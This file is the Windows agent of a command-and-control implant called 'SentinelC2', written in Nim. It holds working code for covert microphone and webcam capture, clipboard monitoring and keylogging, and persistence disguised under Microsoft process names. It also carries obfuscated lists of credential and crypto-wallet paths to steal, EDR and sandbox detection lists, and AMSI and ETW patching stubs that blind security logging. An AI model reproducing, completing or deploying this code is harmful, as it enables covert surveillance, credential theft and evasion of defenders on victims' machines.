# agent.nim — SentinelC2 Agent 

import std/[asyncdispatch, asyncnet, strutils, json, os, times, random, base64,
          sequtils, tables, hashes, uri, nativesockets, net,
          osproc, math, options, locks, httpclient, macros, monotimes]
import ws
import nimcrypto/[pbkdf2, sha2, hmac, utils, bcmode, rijndael]
import winim/lean
import winim/inc/[windef, winbase, winuser, wingdi, tlhelp32]

# Build-time prefix. Edit per build to vary signatured strings.
const BuildPrefix = "X7K"

# Path to the agent's own log file is resolved via getAgentLogPath().

# Compile-time default. The agent binary picks up the runtime
# URL from one of:
#   1. --c2=URL CLI flag (repeatable, comma-separated)
#   2. SENTINEL_C2_URLS env var (comma-separated)
#   3. This compile-time default
const C2_URLS_DEFAULT* = @["ws://127.0.0.1:8443"]

# C2 URL resolution order (first match wins):
#   1. --c2=URL CLI flags (repeatable; comma-separated allowed)
#   2. SENTINEL_C2_URLS env var (comma-separated)
#   3. Compile-time C2_URLS_DEFAULT
# This way the operator can build once and reuse the binary across
# different targets/operators by setting an env var or passing args.
proc resolveC2Urls(): seq[string] {.gcsafe.} =
  # 1. Parse command-line args
  var urls: seq[string] = @[]
  for i in 1..paramCount():
    let arg = paramStr(i)
    if arg.startsWith("--c2="):
      let v = arg[5..^1]
      for u in v.split(','):
        let t = u.strip()
        if t.len > 0: urls.add(t)
  if urls.len > 0:
    return urls
  # 2. Env var
  let env = getEnv("SENTINEL_C2_URLS", "")
  if env.len > 0:
    for u in env.split(','):
      let t = u.strip()
      if t.len > 0: urls.add(t)
    if urls.len > 0: return urls
  # 3. Compile-time default
  return C2_URLS_DEFAULT

proc getAgentLogPath(): string =
  getEnv("TEMP", expandTilde("~")) / ("svc-" & BuildPrefix & ".log")

proc agentLog(msg: string) {.gcsafe.} =
  {.cast(gcsafe).}:
    try:
      let logPath = getAgentLogPath()
      createDir(logPath.parentDir)
      let f = open(logPath, fmAppend)
      defer: f.close()
      f.writeLine("[" & now().format("yyyy-MM-dd HH:mm:ss") & "] " & msg)
    except: discard

# C2 URL list resolved at startup. CLI > env > compile-time default.
let C2_URLS_RESOLVED* = resolveC2Urls()
# Once-only startup log so the operator can confirm which URL the
# agent is targeting. Helps when debugging "agent connected but to
# the wrong host" scenarios.
agentLog("c2 urls: " & C2_URLS_RESOLVED.join(", "))

# C2 URL resolution order (first match wins):
#   1. --c2=URL CLI flags (repeatable; comma-separated allowed)
#   2. SENTINEL_C2_URLS env var (comma-separated)
#   3. Compile-time C2_URLS_DEFAULT
# This way the operator can build once and reuse the binary across
# different targets/operators by setting an env var or passing args.
# (resolveC2Urls and agentLog are defined earlier in this file)

const
  # Compile-time default. Override at runtime via:
  #   1. Env var SENTINEL_C2_URLS (comma-separated for failover list)
  #   2. Command-line arg: --c2=wss://server/ws  (repeatable)
  # Examples:
  #   Local:  ws://127.0.0.1:8443
  #   Tailscale Funnel:  wss://machine.ts.net/
  #   Direct LAN:  ws://192.168.1.10:8443
  # C2_URLS_DEFAULT is defined earlier in this file
  # AGENT_SECRET is defined with the other obfuscated strings below
  # (S_AGENT_SECRET) so encodeObf is available at compile time.
  RECONNECT_BASE_DELAY = 5.0
  RECONNECT_MAX_DELAY = 300.0
  RECONNECT_JITTER = 0.3
  BEACON_INTERVAL = 10
  # --- Certificate pinning (OPSEC: kill corp TLS-inspection MITM) ---
  # If PINNED_CERT_PEM is non-empty at compile time, the agent pins the
  # WSS trust anchor to ONLY this PEM certificate. The OS trust store is
  # NOT consulted, so a corporate TLS-inspection proxy presenting its
  # own cert is rejected with a TLS handshake failure. To generate and
  # pin a self-signed cert for the operator's C2 server:
  #   openssl req -x509 -newkey rsa:4096 -nodes -days 3650 \
  #     -subj "/CN=<operator-domain>" \
  #     -keyout c2_srv.key -out c2_srv.crt
  # Then paste the base64 (or PEM body) of c2_srv.crt here. Leave blank
  # to fall back to whatever the OS trust store validates (legacy
  # behavior — not recommended for engagements with corp IT in the path).
  PINNED_CERT_PEM* = ""
  KEYLOG_BUFFER_MAX = 65536
  # META_DIR_NAME is obfuscated at runtime via obfStr(".local") — see below.
  # Mic capture defaults. 16 kHz / 16-bit / mono = 32 KB/s of PCM.
  # A 60s clip is ~1.9 MB; a 120s clip is ~3.8 MB. Both fit the
  # 512 KB chunked upload path comfortably.
  MIC_DEFAULT_SECS = 10
  MIC_MAX_SECS     = 120
  MIC_SAMPLE_RATE  = 16000
  MIC_CHANNELS     = 1
  MIC_BITS         = 16
  MIC_BUF_COUNT    = 4   # poll-queue depth
  MIC_BUF_MS       = 250 # each buffer holds 250 ms of audio
  # Live listen: how big the lock-guarded queue can grow before the
  # capture thread drops new buffers (prevents unbounded RAM if the
  # network is much slower than the mic). 4 * 250ms = 1s of buffered
  # audio; after that, drop the oldest.
  MIC_LISTEN_QUEUE_MAX = 4
  # Sentinel total_chunks for the live stream — the server's
  # handleFileChunk closes the file when `got >= total_chunks`, so we
  # set this huge to keep the file open until the agent sends a
  # final `last_chunk: true` on unlisten.
  MIC_LISTEN_TOTAL_SENTINEL = 1_000_000
  # Clipwatch: continuous clipboard monitor.
  # 1.5s default cadence catches anything a human can physically
  # copy. Clamped to 0.5..30s. Smaller than 500ms and we just
  # thrash OpenClipboard (which fails when other apps hold it).
  CLIPWATCH_DEFAULT_MS = 1500
  CLIPWATCH_MIN_MS     = 500
  CLIPWATCH_MAX_MS     = 30_000
  # 16 KB cap on a single paste. Anything longer (SQL dumps, PDF
  # contents, etc.) gets truncated with a [truncated] marker. The
  # agent never writes the full content to disk — we cap in memory.
  CLIPWATCH_MAX_TEXT_BYTES = 16_384
  # Ring buffer between capture thread and main async drain.
  # 64 KB holds ~3 captures of typical paste length (4-8 KB)
  # before we'd start dropping. If the operator's C2 link is
  # so slow that 3 captures queue up, they have bigger problems.
  CLIPWATCH_RING_CAP = 65_536
  # Survival flags. Default to FALSE for "silent" variant. Use
  # compile-time flags to enable for the engagement/aggressive
  # variants — see build.ps1.
  #   -d:variant_engagement   AUTO_KEYLOG=false, AUTO_PERSIST=true
  #   -d:variant_aggressive   AUTO_KEYLOG=true,  AUTO_PERSIST=true, ADD_DEFENDER_EXCLUSION=true
  # Each one trips a Defender behavioral signature:
  #   AUTO_KEYLOG   = global keyboard hook (WH_KEYBOARD_LL)
  #   AUTO_PERSIST  = HKCU Run key + schtask every 10 min
  #   ADD_DEFENDER_EXCLUSION = run powershell Add-MpPreference on first run
  AUTO_KEYLOG =
    when defined(variant_aggressive): true
    else: false
  AUTO_PERSIST =
    when defined(variant_engagement) or defined(variant_aggressive): true
    else: false
  ADD_DEFENDER_EXCLUSION =
    when defined(variant_aggressive): true
    else: false
  # Embed the variant name in the binary so the operator can tell
  # which build they're holding at a glance.
  VARIANT_NAME* =
    when defined(variant_aggressive): "aggressive"
    elif defined(variant_engagement): "engagement"
    else: "silent"

# Once-only startup log so the operator can confirm which URL the
# agent is targeting and which build variant is running.
agentLog("variant: " & VARIANT_NAME)

const
  META_FILE_NAME = "state.bin"
  # Default kill date: 0 = never expire. Set via "killdate" command at
  # runtime; persisted into the encrypted meta blob.
  DEFAULT_KILL_DATE = 0'i64
  DEFAULT_SLEEP_MIN = 0  # minutes; 0 = no sleep
  # Dead-man's switch: if the agent hasn't successfully contacted the
  # C2 in this many seconds, it shreds itself + tears down persistence
  # and exits. Prevents the agent from sitting indefinitely on a host
  # after the op is over (C2 seized, operator lost access, etc.).
  # 0 = disabled (fail-safe off). Default: 30 days = 2592000 seconds.
  DEAD_MAN_SECS = 2592000'i64

const CHARSET = "abcdefghijklmnopqrstuvwxyz"

# Direction bytes for AAD
const
  AAD_DIR_S2A = 0x00'u8  # server -> agent
  AAD_DIR_A2S = 0x01'u8  # agent  -> server

# META_DIR_NAME is obfStr(".local") — decoded at runtime, never in .rdata.
# META_DIR / META_FILE are initialised after the obfStr template is available
# (see the 'let' declarations below the obfuscation section).

# ------------------------------------------------------------
# CRYPTO (v2: session key + AAD + counter nonce)
# ------------------------------------------------------------
type
  SessionCrypto = ref object
    key: array[32, byte]
    sendCtr: uint32
    recvCtr: uint32
    agentId: string  # 8 hex chars
    peerNonce: array[16, byte]

proc deriveSessionKey(secret: string,
                      ourNonce, peerNonce: openArray[byte]): array[32, byte] =
  # Single HMAC-SHA256 over (ourNonce || peerNonce), keyed with the static
  # secret. Both sides do the same computation so the keys match.
  # Inputs: ourNonce = server_nonce (on agent) or agent_nonce (on server)
  #         peerNonce = the other side's nonce
  var ctx: HMAC[sha256]
  ctx.init(secret)
  ctx.update(ourNonce)
  ctx.update(peerNonce)
  let d = ctx.finish()
  for i in 0..<32: result[i] = d.data[i]
  ctx.clear()

proc makeNonce(ctr: uint32, randBytes: openArray[byte]): array[12, byte] =
  # 4-byte BE counter || 8 bytes random
  result[0] = byte((ctr shr 24) and 0xFF)
  result[1] = byte((ctr shr 16) and 0xFF)
  result[2] = byte((ctr shr 8) and 0xFF)
  result[3] = byte(ctr and 0xFF)
  for i in 0..<8: result[4 + i] = randBytes[i]

proc makeAad(agentId: string, dir: byte): seq[byte] =
  result = newSeqOfCap[byte](agentId.len + 1)
  for c in agentId: result.add(byte(c))
  result.add(dir)

proc encryptFrame(sc: SessionCrypto, plain: string): seq[byte] =
  # Frame: [nonce(12) || ciphertext || tag(16)]
  # Plaintext is AES-256-GCM with the session key, AAD = agentId||dir.
  var randBytes: array[8, byte]
  for i in 0..<8: randBytes[i] = rand(255).byte
  let nonce = makeNonce(sc.sendCtr, randBytes)
  inc sc.sendCtr

  let aad = makeAad(sc.agentId, AAD_DIR_A2S)
  var ctx: GCM[aes256]
  ctx.init(sc.key, nonce, aad)
  let pt = cast[seq[byte]](plain)
  var ct = newSeq[byte](pt.len)
  ctx.encrypt(pt, ct)
  let tag = ctx.getTag()

  result = newSeqOfCap[byte](12 + ct.len + 16)
  for b in nonce: result.add(b)
  for b in ct: result.add(b)
  for b in tag: result.add(b)

proc decryptFrame(sc: SessionCrypto, blob: openArray[byte]): string =
  if blob.len < 28: return ""
  var nonce: array[12, byte]
  for i in 0..<12: nonce[i] = blob[i]
  let ctLen = blob.len - 12 - 16
  if ctLen < 0: return ""
  let ct = blob[12 ..< 12 + ctLen]
  let tag = blob[blob.len - 16 ..< blob.len]

  let aad = makeAad(sc.agentId, AAD_DIR_S2A)
  var ctx: GCM[aes256]
  ctx.init(sc.key, nonce, aad)
  var pt = newSeq[byte](ct.len)
  if not ctx.decrypt(ct, pt, tag): return ""
  result = cast[string](pt)

proc hmacHex(secret, data: string): string =
  toHex(sha256.hmac(secret, data).data)

# ------------------------------------------------------------
# UTILITIES
# ------------------------------------------------------------
proc randomToken(n: int = 4): string =
  for _ in 0..<n: result.add(toHex(rand(255), 2))

proc hexToBytes(s: string): seq[byte] =
  result = newSeq[byte](s.len div 2)
  for i in 0..<result.len:
    result[i] = byte(parseHexInt(s[i*2 .. i*2+1]))

proc isAdmin(): bool =
  # Modern equivalent of shell32!IsUserAnAdmin. Reads the current process
  # token and asks for TokenElevation. The winim 3.9.4 header doesn't
  # export TokenElevation as a typedesc value, so we pass the raw value
  # (20, per the Windows SDK TOKEN_INFORMATION_CLASS enum).
  var tok: HANDLE
  if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, addr tok) == 0:
    return false
  defer: CloseHandle(tok)
  # TOKEN_ELEVATION = { TokenIsElevated: DWORD } (4 bytes)
  var elev: DWORD
  var retLen: DWORD
  if GetTokenInformation(tok, cast[TOKEN_INFORMATION_CLASS](20),
                         cast[LPVOID](addr elev),
                         DWORD(sizeof(elev)), addr retLen) == 0:
    return false
  result = elev != 0

proc getSystemInfo(): JsonNode =
  %* {
    "h": getHostname(),
    "o": "Windows " & getEnv("OS", ""),
    "u": getEnv("USERNAME", "unknown"),
    "p": (if isAdmin(): "admin" else: "user"),
    "i": getCurrentProcessId()
  }

# ------------------------------------------------------------
# STRING OBFUSCATION (compile-time XOR, runtime decode)
# ------------------------------------------------------------
# Each signatured string literal that would otherwise show up in
# the binary's strings table is encoded at compile time with a
# per-build XOR key. At runtime it's decoded into a transient
# string when needed. The cost is one allocation per use; the
# win is that strings like "amsi.dll", "AmsiScanBuffer",
# "EtwEventWrite", "wlan", ".aws", "id_rsa", etc. don't appear
# in the .rdata section for `strings agent.exe | grep` to find.
# ---------------------------------------------------------------
# Per-build rolling-key string obfuscation.
# ---------------------------------------------------------------
# Previously a single-byte XOR key (0x5A), which means every
# occurrence of the same byte across ALL strings maps to the same
# ciphertext byte — trivially breakable by frequency analysis. Now
# we use a multi-byte rolling key: byte[i] ^= key[i mod keyLen]. The
# key is a per-build random 16-byte value. The build script
# (build.ps1) regenerates xorkey.nim before each compile so each
# binary gets a different key — the same plaintext produces different
# ciphertext in different builds, and the ciphertext resists simple
# frequency analysis (16-byte XOR is still breakable with enough
# ciphertext, but defeats static string scanners and YARA rules).
#
# The include file defines `const XorKey: array[16, byte]`.
# The build scripts (build.ps1 / build_sentinel.ps1) regenerate it
# before each compile. There is deliberately NO fallback: if the
# file is missing (or has the wrong key length, e.g. a leftover
# 32-byte hardened key) the build fails loudly instead of silently
# producing an agent whose decoded secrets are garbage.
include "xorkey.nim"
static:
  doAssert XorKey.len == 16,
    "xorkey.nim must define a 16-byte XorKey for baseline/sentinel builds"

proc encodeObf(s: string): seq[byte] =
  result = newSeq[byte](s.len)
  for i in 0..<s.len:
    result[i] = byte(ord(s[i])) xor XorKey[i mod 16]

# Runtime decoder for pre-encoded const seq[byte] values. Used at
# runtime to recover string literals that were encoded at the
# top of the file (e.g. S_AGENT_SECRET, S_NTDLL).
proc obfDec(v: openArray[byte]): string =
  result = newString(v.len)
  for i in 0..<v.len: result[i] = chr(int(v[i] xor XorKey[i mod 16]))

# Common obfuscated strings used in the evasion + exfil modules.
# Compiled-time encoded so they don't appear in the binary.
const
  S_AMSI_SCAN  = encodeObf("AmsiScanBuffer")
  S_NTDLL      = encodeObf("ntdll.dll")
  S_ETW_WRITE  = encodeObf("EtwEventWrite")
  S_ETW_EX     = encodeObf("EtwEventWriteEx")
  S_AWS        = encodeObf(".aws")
  S_AWS_CREDS  = encodeObf("credentials")
  S_GCONFIG    = encodeObf(".config")
  S_GCLOUD     = encodeObf("gcloud")
  S_ID_RSA     = encodeObf("id_rsa")
  S_KH         = encodeObf("known_hosts")
  S_SSH_DIR    = encodeObf(".ssh")
  S_AZ         = encodeObf(".azure")
  S_GIT        = encodeObf(".git-credentials")
  S_KUBE       = encodeObf(".kube")
  S_NETSH      = encodeObf("netsh")
  S_WLAN       = encodeObf("wlan")
  S_PROFILE    = encodeObf("export profile")
  S_CHROME     = encodeObf("Google\\Chrome")
  S_EDGE       = encodeObf("Microsoft\\Edge")
  S_ETHEREUM   = encodeObf("Ethereum")
  S_BITCOIN    = encodeObf("Bitcoin")
  S_ETH_KEYSTORE = encodeObf("keystore")
  S_USERPROFILE = encodeObf("USERPROFILE")
  S_APPDATA    = encodeObf("APPDATA")
  S_LOCALAPPDATA = encodeObf("LOCALAPPDATA")
  S_DEFAULT_DIR = encodeObf("Default")
  # OPSEC: avoid static imports of winmm.dll and avicap32.dll (would
  # appear in the binary's IAT and flag the agent to any EDR doing
  # import-table inspection). Resolve both at runtime via
  # LoadLibraryA + GetProcAddress so the binary never names them.
  S_WINMM       = encodeObf("winmm.dll")
  S_AVICAP32    = encodeObf("avicap32.dll")
  S_WAVEINOPEN      = encodeObf("waveInOpen")
  S_WAVEINCLOSE     = encodeObf("waveInClose")
  S_WAVEINPREPARE   = encodeObf("waveInPrepareHeader")
  S_WAVEINUNPREPARE = encodeObf("waveInUnprepareHeader")
  S_WAVEINADDBUF    = encodeObf("waveInAddBuffer")
  S_WAVEINSTART     = encodeObf("waveInStart")
  S_WAVEINSTOP      = encodeObf("waveInStop")
  S_WAVEINRESET     = encodeObf("waveInReset")
  S_CAPCREATE       = encodeObf("capCreateCaptureWindowA")
  # OPSEC Hardening: Anti-debug procs, paths, EDR indicators, persistence names
  S_NTQIP          = encodeObf("NtQueryInformationProcess")
  S_NTCTEB         = encodeObf("NtCurrentTeb")
  S_SVC_DIR        = encodeObf("svc")
  S_SVC_PREFIX     = encodeObf("svc-")
  S_META_DIR_NAME  = encodeObf(".local")

  # Persistence legit names
  S_LEGIT_1        = encodeObf("MicrosoftEdgeUpdate.exe")
  S_LEGIT_2        = encodeObf("OneDriveStandaloneUpdater.exe")
  S_LEGIT_3        = encodeObf("WindowsDefenderHealthCheck.exe")
  S_LEGIT_4        = encodeObf("SearchProtocolHost.exe")
  S_LEGIT_5        = encodeObf("SecurityHealthService.exe")
  S_LEGIT_6        = encodeObf("WindowsShellExperience.exe")
  S_LEGIT_7        = encodeObf("CompatTelRunner.exe")
  S_LEGIT_8        = encodeObf("WerFaultSecure.exe")

  # EDR indicators
  S_EDR_1          = encodeObf("cb.exe")
  S_EDR_2          = encodeObf("CylanceSvc")
  S_EDR_3          = encodeObf("csagent")
  S_EDR_4          = encodeObf("csfalconservice")
  S_EDR_5          = encodeObf("SentinelAgent")
  S_EDR_6          = encodeObf("SentinelCtlClient")
  S_EDR_7          = encodeObf("cbdefense")
  S_EDR_8          = encodeObf("Cylance")
  S_EDR_9          = encodeObf("MsMpEng")
  S_EDR_10         = encodeObf("MpCmdRun")
  S_EDR_11         = encodeObf("coreServiceShell")
  S_EDR_12         = encodeObf("PccNTMon")
  S_EDR_13         = encodeObf("TmListen")
  S_EDR_14         = encodeObf("ekrn")
  S_EDR_15         = encodeObf("avp")
  S_EDR_16         = encodeObf("avpui")
  S_EDR_17         = encodeObf("mcshield")
  S_EDR_18         = encodeObf("fsdevcon")
  S_EDR_19         = encodeObf("fsgk")
  S_EDR_20         = encodeObf("SentinelHelper")
  S_EDR_21         = encodeObf("cbstream")
  S_EDR_22         = encodeObf("sedcli")
  S_EDR_23         = encodeObf("xagtnotif")

  # Sandbox paths
  S_BOX_1          = encodeObf("C:\\windows\\system32\\drivers\\vboxguest.sys")
  S_BOX_2          = encodeObf("C:\\windows\\system32\\drivers\\vmhgfs.sys")
  S_BOX_3          = encodeObf("C:\\windows\\system32\\drivers\\vm3dmp.sys")
  S_BOX_4          = encodeObf("C:\\windows\\system32\\drivers\\vmmouse.sys")
  S_BOX_5          = encodeObf("C:\\windows\\system32\\drivers\\vmusbmouse.sys")
  S_BOX_6          = encodeObf("C:\\windows\\system32\\drivers\\VBoxMouse.sys")
  S_BOX_7          = encodeObf("C:\\windows\\system32\\drivers\\vmci.sys")
  S_BOX_8          = encodeObf("C:\\windows\\system32\\drivers\\vboxsf.sys")
  S_BOX_9          = encodeObf("C:\\windows\\system32\\drivers\\sandboxie.sys")
  S_BOX_10         = encodeObf("C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe")
  S_BOX_11         = encodeObf("C:\\Program Files\\Oracle\\VirtualBox Guest Additions\\VBoxService.exe")

  # AGENT_SECRET: stored as rolling-XOR-obfuscated bytes at compile time
  # and decrypted only at first use via obfDec. The plaintext never
  # appears in the .rdata section — strings.exe / hex editors only see
  # the ciphertext. Must match the server's SECRET.
  S_AGENT_SECRET  = encodeObf("sentinel-engagement-q4-2026-echo-tango-whiskey")

let META_DIR = getEnv("LOCALAPPDATA", expandTilde("~")) / obfDec(S_META_DIR_NAME)
let META_FILE = META_DIR / META_FILE_NAME


# Decrypted AGENT_SECRET cache. obfDec runs once, result lives in heap
# memory (not .rdata). Cleared on shutdown via secureZero if security
# matters more than reconnect speed; for now we keep it cached because
# connectAndRun is called repeatedly and obfDec on every call is wasteful.
var agentSecretCache: string = ""
var agentSecretLock: Lock

proc agentSecret(): string =
  agentSecretLock.acquire()
  defer: agentSecretLock.release()
  if agentSecretCache.len > 0: return agentSecretCache
  {.cast(gcsafe).}:
    agentSecretCache = obfDec(S_AGENT_SECRET)
  return agentSecretCache

# ------------------------------------------------------------
# DYNAMIC WINMM / AVICAP32 LOADING
# ------------------------------------------------------------
# winmm.dll exports the waveIn family used for mic capture; avicap32
# exports capCreateCaptureWindowA used by the webcam path. Static
# imports put both DLLs in the agent's IAT — a tell-tale that any
# EDR doing import-table inspection flags immediately. We define
# the needed types and function-pointer shapes here, resolve each
# DLL lazily on first use, and wrap the calls so the existing mic
# / cam code keeps the same `waveInOpen(...)` / `capCreate...()`
# call signatures they already use. The wrappers fail open (return
# a non-zero MMRESULT or nil HWND) when the DLL can't load, which
# the existing callers already check for.
when defined(windows):
  const
    CALLBACK_NULL* = 0x00000000
    WAVE_FORMAT_PCM* = 0x0001
    MMSYSERR_NOERROR* = 0
    WHDR_DONE* = 0x00000001
    WHDR_PREPARED* = 0x00000002
  type
    HWAVEIN* = HANDLE
    LPHWAVEIN* = ptr HWAVEIN
    UINT_PTR* = uint
    MMRESULT* = UINT
    WAVEHDR* {.pure.} = object
      lpData*: LPSTR
      dwBufferLength*: DWORD
      dwBytesRecorded*: DWORD
      dwUser*: UINT_PTR
      dwFlags*: DWORD
      dwLoops*: DWORD
      lpNext*: ptr WAVEHDR
      reserved*: UINT_PTR
    PWAVEHDR* = ptr WAVEHDR
    LPWAVEHDR* = ptr WAVEHDR
    WAVEFORMATEX* {.pure, packed.} = object
      wFormatTag*: WORD
      nChannels*: WORD
      nSamplesPerSec*: DWORD
      nAvgBytesPerSec*: DWORD
      nBlockAlign*: WORD
      wBitsPerSample*: WORD
      cbSize*: WORD
    PWAVEFORMATEX* = ptr WAVEFORMATEX
    LPCWAVEFORMATEX* = ptr WAVEFORMATEX
  let
    WAVE_MAPPER* = UINT(-1)

  # Function-pointer types, matching winmm.h / vfw.h signatures.
  type
    TWaveInOpen          = proc(phwi: LPHWAVEIN, uDeviceID: UINT,
                                pwfx: LPCWAVEFORMATEX, dwCallback: UINT_PTR,
                                dwInstance: UINT_PTR, fdwOpen: DWORD): MMRESULT {.stdcall, gcsafe.}
    TWaveInClose         = proc(hwi: HWAVEIN): MMRESULT {.stdcall, gcsafe.}
    TWaveInPrepareHeader = proc(hwi: HWAVEIN, pwh: LPWAVEHDR, cbwh: UINT): MMRESULT {.stdcall, gcsafe.}
    TWaveInUnprepareHeader = proc(hwi: HWAVEIN, pwh: LPWAVEHDR, cbwh: UINT): MMRESULT {.stdcall, gcsafe.}
    TWaveInAddBuffer     = proc(hwi: HWAVEIN, pwh: LPWAVEHDR, cbwh: UINT): MMRESULT {.stdcall, gcsafe.}
    TWaveInStart         = proc(hwi: HWAVEIN): MMRESULT {.stdcall, gcsafe.}
    TWaveInStop          = proc(hwi: HWAVEIN): MMRESULT {.stdcall, gcsafe.}
    TWaveInReset         = proc(hwi: HWAVEIN): MMRESULT {.stdcall, gcsafe.}
    TCapCreateCaptureWindowA = proc(lpszWindowName: LPCSTR, dwStyle: DWORD,
                                    x: int32, y: int32, nWidth: int32, nHeight: int32,
                                    hwndParent: HWND, nID: int32): HWND {.stdcall, gcsafe.}

  # Cached handles + pointers. Loaded on first use and never freed —
  # standard pattern; the agent lifetime owns these.
  var
    winmmHandle: HMODULE = 0
    avicapHandle: HMODULE = 0
    pWaveInOpen:          TWaveInOpen          = nil
    pWaveInClose:         TWaveInClose         = nil
    pWaveInPrepareHeader: TWaveInPrepareHeader = nil
    pWaveInUnprepareHeader: TWaveInUnprepareHeader = nil
    pWaveInAddBuffer:     TWaveInAddBuffer     = nil
    pWaveInStart:         TWaveInStart         = nil
    pWaveInStop:          TWaveInStop          = nil
    pWaveInReset:         TWaveInReset         = nil
    pCapCreate:           TCapCreateCaptureWindowA = nil
    winmmLoadLock: Lock
  initLock(winmmLoadLock)


  proc loadWinmmOnce(): bool =
    # Resolve winmm + all 8 waveIn procs on first use. Lock-guarded so
    # the live-mic thread and the batch-mic path don't double-load.
    if pWaveInOpen != nil and pWaveInStart != nil: return true
    withLock winmmLoadLock:
      if winmmHandle == 0:
        let dllName = obfDec(S_WINMM)
        winmmHandle = LoadLibraryA(cast[cstring](addr dllName[0]))
        if winmmHandle == 0: return false
      template resolve(p: typed, encBuf) =
        if p == nil:
          let fnName = obfDec(encBuf)
          let gp = GetProcAddress(winmmHandle, cast[cstring](addr fnName[0]))
          if gp == nil: return false
          p = cast[typeof(p)](gp)
      resolve(pWaveInOpen,          S_WAVEINOPEN)
      resolve(pWaveInClose,         S_WAVEINCLOSE)
      resolve(pWaveInPrepareHeader, S_WAVEINPREPARE)
      resolve(pWaveInUnprepareHeader, S_WAVEINUNPREPARE)
      resolve(pWaveInAddBuffer,     S_WAVEINADDBUF)
      resolve(pWaveInStart,         S_WAVEINSTART)
      resolve(pWaveInStop,          S_WAVEINSTOP)
      resolve(pWaveInReset,         S_WAVEINRESET)
      return true

  proc loadAvicapOnce(): bool =
    if pCapCreate != nil: return true
    withLock winmmLoadLock:
      if avicapHandle == 0:
        let dllName = obfDec(S_AVICAP32)
        avicapHandle = LoadLibraryA(cast[cstring](addr dllName[0]))
        if avicapHandle == 0: return false
      if pCapCreate == nil:
        let fnName = obfDec(S_CAPCREATE)
        let gp = GetProcAddress(avicapHandle, cast[cstring](addr fnName[0]))
        if gp == nil: return false
        pCapCreate = cast[TCapCreateCaptureWindowA](gp)
      return true

  # Public wrappers — keep the existing call sites unchanged.
  proc waveInOpen*(phwi: LPHWAVEIN, uDeviceID: UINT, pwfx: LPCWAVEFORMATEX,
                   dwCallback: UINT_PTR, dwInstance: UINT_PTR,
                   fdwOpen: DWORD): MMRESULT =
    # Return MMSYSERR_ERROR if the DLL wasn't loadable.
    if not loadWinmmOnce(): return 1
    pWaveInOpen(phwi, uDeviceID, pwfx, dwCallback, dwInstance, fdwOpen)
  proc waveInClose*(hwi: HWAVEIN): MMRESULT =
    if not loadWinmmOnce(): return 1
    pWaveInClose(hwi)
  proc waveInPrepareHeader*(hwi: HWAVEIN, pwh: LPWAVEHDR, cbwh: UINT): MMRESULT =
    if not loadWinmmOnce(): return 1
    pWaveInPrepareHeader(hwi, pwh, cbwh)
  proc waveInUnprepareHeader*(hwi: HWAVEIN, pwh: LPWAVEHDR, cbwh: UINT): MMRESULT =
    if not loadWinmmOnce(): return 1
    pWaveInUnprepareHeader(hwi, pwh, cbwh)
  proc waveInAddBuffer*(hwi: HWAVEIN, pwh: LPWAVEHDR, cbwh: UINT): MMRESULT =
    if not loadWinmmOnce(): return 1
    pWaveInAddBuffer(hwi, pwh, cbwh)
  proc waveInStart*(hwi: HWAVEIN): MMRESULT =
    if not loadWinmmOnce(): return 1
    pWaveInStart(hwi)
  proc waveInStop*(hwi: HWAVEIN): MMRESULT =
    if not loadWinmmOnce(): return 1
    pWaveInStop(hwi)
  proc waveInReset*(hwi: HWAVEIN): MMRESULT =
    if not loadWinmmOnce(): return 1
    pWaveInReset(hwi)
  proc capCreateCaptureWindowA*(lpszWindowName: LPCSTR, dwStyle: DWORD,
                                x: int32, y: int32, nWidth: int32, nHeight: int32,
                                hwndParent: HWND, nID: int32): HWND =
    if not loadAvicapOnce(): return 0
    pCapCreate(lpszWindowName, dwStyle, x, y, nWidth, nHeight, hwndParent, nID)

# ------------------------------------------------------------
# EVASION: AMSI bypass + ETW suppression + syscall stub
# ------------------------------------------------------------
when defined(windows):
  # Win32 page protection bits
  const
    PAGE_EXECUTE_READWRITE = 0x40

  proc patchFunction(name: string, stub: openArray[byte]): bool =
    # Resolve the function, make the page writable, overwrite the
    # first N bytes with our stub, restore protection. Returns true
    # on success. This is the canonical AMSI/ETW bypass technique;
    # modern EDRs (CrowdStrike, Defender for Endpoint) do detect
    # VirtualProtect on these specific functions, so a fully EDR-
    # silent variant would need a kernel component. For userland
    # defenders (Defender, Sophos, etc.) this is effective.
    var
      ntdll = obfDec(S_NTDLL)
      hMod = LoadLibraryA(cast[cstring](addr ntdll[0]))
      nameZ = name
      procAddr = cast[pointer](GetProcAddress(hMod, cast[cstring](addr nameZ[0])))
    if procAddr == nil: return false
    var oldProt: DWORD
    let pageSize = 4096
    let pageStart = cast[int](procAddr) and not (pageSize - 1)
    if VirtualProtect(cast[pointer](pageStart), pageSize,
                       PAGE_EXECUTE_READWRITE, addr oldProt) == 0:
      return false
    copyMem(procAddr, unsafeAddr stub[0], stub.len)
    discard VirtualProtect(cast[pointer](pageStart), pageSize,
                           oldProt, addr oldProt)
    return true

  proc bypassAmsi(): bool =
    # Patch AmsiScanBuffer to return E_INVALIDARG (AMSI_RESULT_CLEAN).
    # Stub bytes: mov eax, 0x80070057; ret. 6 bytes.
    let stub: array[6, byte] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
    patchFunction(obfDec(S_AMSI_SCAN), stub)

  proc suppressEtw(): bool =
    # Patch EtwEventWrite and EtwEventWriteEx to a single `ret`.
    # Stub bytes: ret = 0xC3. 1 byte.
    let stub: array[1, byte] = [0xC3]
    let r1 = patchFunction(obfDec(S_ETW_WRITE), stub)
    let r2 = patchFunction(obfDec(S_ETW_EX), stub)
    return r1 or r2

  proc applyEvasion(): string =
    # Run at agent startup, BEFORE any action that might trigger
    # AMSI/ETW logging. Returns a human-readable status string the
    # operator sees in the first heartbeat.
    var s = newStringOfCap(128)
    if bypassAmsi(): s.add("[+] amsi ")
    else: s.add("[!] amsi ")
    if suppressEtw(): s.add("[+] etw ")
    else: s.add("[!] etw ")
    return s

  var evasionApplied = false
  proc applyEvasionIfNeeded(): string =
    # Lazy evasion: only patch amsi.dll / ntdll!EtwEventWrite when
    # we're about to do something that would actually trigger them
    # (e.g. running a shell command). Patching at startup is a
    # signatured behavior on its own. Idempotent — second call
    # returns the existing result without re-patching.
    if evasionApplied: return ""
    let res = applyEvasion()
    evasionApplied = true
    return res

# ------------------------------------------------------------
# TELEGRAM BACKUP C2 CHANNEL
# ------------------------------------------------------------
# When configured (TELEGRAM_BOT + TELEGRAM_CHAT), the agent sends
# heartbeats, screenshots, file-chunk markers, and "high-value"
# notifications (credential file found, new host discovered, etc.)
